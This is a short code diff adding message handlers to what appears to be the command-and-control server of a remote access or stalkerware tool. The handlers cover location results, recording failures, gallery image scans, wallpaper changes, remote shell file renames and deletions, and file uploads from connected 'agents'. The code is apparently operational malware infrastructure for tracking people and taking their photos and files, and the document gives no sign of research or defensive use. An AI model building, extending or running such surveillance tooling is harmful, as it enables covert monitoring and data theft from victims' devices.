@@ -57,7 +57,15 @@ def handle_incoming_data(data, client_id):
                     "location_url": p.get("data", {}).get("url") if isinstance(p.get("data"), dict) else p.get("url"),
                     "location_image": p.get("data", {}).get("image_url") if isinstance(p.get("data"), dict) else None
                 }),
+                'LOCATION_FAIL': lambda p: client_data.update({"location_status": "error", "agent_messages": [p.get("error")]}),
                 'RECORD_STATUS': lambda p: client_data.update({"record_status": p.get("status")}),
+                'RECORD_FAIL': lambda p: client_data.update({"record_status": "failed", "agent_messages": [p.get("error")]}),
+                'GALLERY_PAGE_DATA': lambda p: client_data['gallery'].update(p.get("data", {})),
+                'GALLERY_SCAN_COMPLETE': lambda p: add_log(f"[{client_id}] Gallery scan complete: {p.get('image_count')} images"),
+                'WALLPAPER_STATUS': lambda p: client_data.update({"agent_messages": [p.get("status")]}),
+                'SHELL_RENAME_SUCCESS': lambda p: add_log(f"[{client_id}] File renamed to {p.get('new_name')}"),
+                'SHELL_DEL_SUCCESS': lambda p: add_log(f"[{client_id}] File deleted: {p.get('file')}"),
+                'UPLOAD_SUCCESS': lambda p: add_log(f"[{client_id}] File uploaded: {p.get('file')}"),
             }
 
             if log_type in handler_map:
